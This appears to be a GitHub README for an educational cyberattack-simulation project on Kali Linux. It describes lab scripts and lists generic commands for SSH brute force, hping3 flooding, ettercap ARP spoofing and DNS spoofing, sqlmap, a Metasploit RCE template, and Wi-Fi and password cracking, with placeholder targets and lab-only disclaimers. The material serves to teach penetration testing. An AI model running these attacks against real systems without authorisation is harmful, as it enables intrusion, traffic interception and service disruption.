# 🚀 Cyber Attack Simulation for Penetration Testing on Kali Linux

## Project Overview

This project is an **educational simulation of common cyberattacks**, designed for learning purposes and to understand penetration testing techniques. The goals are to:

* Understand vulnerabilities in servers and networks.
* Learn how common attacks work in **controlled lab environments**.
* Analyze defensive measures and security hardening effectiveness.

**⚠️ Disclaimer:**
This project is strictly for **educational purposes only**. Do **not** use these scripts on unauthorized systems. Misuse can be illegal and unethical.

---

## Features / Simulated Attacks

| Attack                         | Description                                     | Notes                                                             |
| ------------------------------ | ----------------------------------------------- | ----------------------------------------------------------------- |
| **Ping Sweep (ICMP)**          | Network reconnaissance using ICMP echo requests | Detects active hosts in a subnet                                  |
| **TCP Port Scan**              | Scan for open ports on a target host            | Understands attack surface enumeration                            |
| **SSH Brute Force Simulation** | Attempts password login with sample passwords   | Shows how brute force works and the importance of strong credentials        |
| **Safe DoS Simulation**        | Simulated Denial of Service attack              | Safe for lab, monitors system behavior without harming production |

---

## Requirements

- **Kali Linux** (tested on 2023.3+)
- **Python 3.10+**
- Python packages:

  * `scapy` for packet crafting and analysis
  * `paramiko` for SSH simulation
  * `socket` and `subprocess` (standard library)

---

## Installation

1. Clone the repository:

```bash
git clone https://github.com/yourusername/cyber-attack-simulation-kali.git
cd cyber-attack-simulation-kali
```

2. Create and activate virtual environment:

```bash
python3 -m venv venv
source venv/bin/activate
```

3. Install dependencies:

```bash
pip install -r requirements.txt
```

---

## Usage Examples

### 1. Ping Sweep (ICMP)

```bash
python attacks/ping_sweep.py --subnet 192.168.56.0/24
```

**Expected Output:**

```
Starting ping sweep on 192.168.56.0/24...
[+] Host 192.168.56.101 is up.
[+] Host 192.168.56.102 is up.
...
```

---

### 2. TCP Port Scan

```bash
python attacks/port_scan.py --target 192.168.56.101 --ports 20-1024
```

**Expected Output:**

```
Scanning ports on 192.168.56.101...
[+] Port 22 is open
[+] Port 80 is open
[+] Port 443 is open
...
```

---

### 3. SSH Brute Force Simulation

```bash
python attacks/brute_force_ssh.py --host 127.0.0.1 --user testuser --passwords passwords.txt
```

**Expected Output:**

```
Trying password: 1234
Trying password: password
[+] Success! Password found: test123
```

---

### 4. Safe DoS Simulation

```bash
python attacks/dos_simulation.py --target 127.0.0.1 --port 80 --count 50
```

**Expected Output:**

```
[+] Simulated 50 requests to 127.0.0.1:80
```

---

## Safety & Ethics

* Only run simulations in a **controlled lab environment**.
* **Do not target public servers or networks** without permission.
* The project is meant for **learning, testing, and skill demonstration**.

---



## 🛠️ Steps to Implement

### Environment Setup

Install Kali Linux:
1. Download from the official website.
2. Follow the installation instructions.

Update System:
```bash
sudo apt update && sudo apt upgrade -y
```

Install Penetration Testing Tools:
```bash
sudo apt install nmap ncat hping3 ettercap-common ettercap-graphical bettercap wireshark
sudo apt install hydra
sudo apt install git
sudo apt install sqlmap
sudo apt install gobuster
```

### Execute Attack Simulations

1. **Brute-Force Attack:**
   - Description: Attempts to gain unauthorized access by trying numerous password combinations.
   - Impact: Can compromise user accounts if weak passwords are used.
   - Target: SSH service.
   - Command:
     ```bash
     hydra -l <username> -P <password_list> ssh://<TARGET_IP>
     ```
     
2. **Firewall Bypass Attempt:**
   - Description: Tests if firewall rules can be evaded.
   - Impact: Potentially exposes services that should be protected by the firewall.
   - Target: Open ports through firewall.
   - Commands:

     Identify firewall rules:
     ```bash
     nmap -p- <TARGET_IP>
     ```

     Attempt bypass:
     ```bash
     nmap -f -p <TARGET_PORT> <TARGET_IP>
     ```
     
3. **Denial of Service (DoS) Attack:**
   - Description: Overwhelms a service to make it unavailable.
   - Impact: Service disruption or downtime.
   - Target: Web server or application.
   - Commands:

     Using hping3:
     ```bash
     sudo hping3 --flood -p 80 <TARGET_IP>
     ```
   
4. **Man-in-the-Middle (MitM) Attack:**
   - Description: Intercepts and manipulates communication between two parties.
   - Impact: Data leakage or alteration.
   - Target: Network traffic between clients and servers.
   - Commands:

     Use Ettercap:
     ```bash
     sudo ettercap -T -M arp:remote /<TARGET_IP>/ /<GATEWAY_IP>/
     ```

     Capture traffic:
     ```bash
     sudo tcpdump -i eth0 -w /root/mitm_data.pcap
     ```

     Analyze with Wireshark:
     ```bash
     sudo wireshark /root/mitm_data.pcap
     ```
     
5. **SQL Injection:**
   - Description: Injects malicious SQL queries to manipulate a database.
   - Impact: Unauthorized access to database or data corruption.
   - Target: Web applications with SQL databases.
   - Command:
     ```bash
     sqlmap -u "<TARGET_URL>" --dbs
     ```

6. **Network Sniffing:**
   - Description: Captures and analyzes network traffic to extract sensitive information.
   - Impact: Exposure of unencrypted data.
   - Target: Network traffic.
   - Command:
     ```bash
     sudo tcpdump -i eth0 -w /root/network_traffic.pcap
     ```

7. **Session Hijacking:**
    - Description: Takes over an active user session.
    - Impact: Unauthorized access to user accounts and data.
    - Target: Web sessions.
    - Command:
      ```bash
      sudo ettercap -T -M arp:remote /<TARGET_IP>/ /<GATEWAY_IP>/
      ```

8. **Exploit Remote Code Execution (RCE):**
    - Description: Exploits a vulnerability to execute arbitrary commands on a remote system.
    - Impact: Full control over the remote system.
    - Target: Remote servers with RCE vulnerabilities.
    - Command:
      ```bash
      msfconsole
      use exploit/linux/http/<exploit_module>
      set RHOSTS <TARGET_IP>
      exploit
      ```
      
9. **Password Cracking:**
    - Description: Uses various techniques to recover passwords from hashes.
    - Impact: Compromise of user accounts.
    - Target: Password hashes.
    - Command:
      ```bash
      john --wordlist=<wordlist> <hash_file>
      ```

10. **Wi-Fi Network Attack:**
    - Description: Attacks Wi-Fi networks to crack passwords or intercept traffic.
    - Impact: Unauthorized access to network and data.
    - Target: Wi-Fi networks.
    - Command:
      ```bash
      aircrack-ng -w <wordlist> -b <BSSID> <capture_file>
      ```

11. **DNS Spoofing:**
    - Description: Redirects DNS requests to malicious servers.
    - Impact: Phishing or data interception.
    - Target: DNS traffic.
    - Command:
      ```bash
      sudo ettercap -T -M arp:remote /<TARGET_IP>/ /<DNS_SERVER_IP>/
      ```

12. **Web Application Scanning:**
    - Description: Scans web applications for vulnerabilities.
    - Impact: Identifies weaknesses for further exploitation.
    - Target: Web applications.
    - Command:
      ```bash
      nikto -h <TARGET_URL>
      ```

## 📬 Contact 

If you have any questions or suggestions, feel free to reach out:

- ✉️ Email: tania.fatmawati20@gmail.com
- 🔗 LinkedIn: linkedin.com/in/tania-fatma-wati/
- 💻 GitHub: github.com/taniafatmawati

Thank you for exploring my Cyber Attack Simulation documentation!
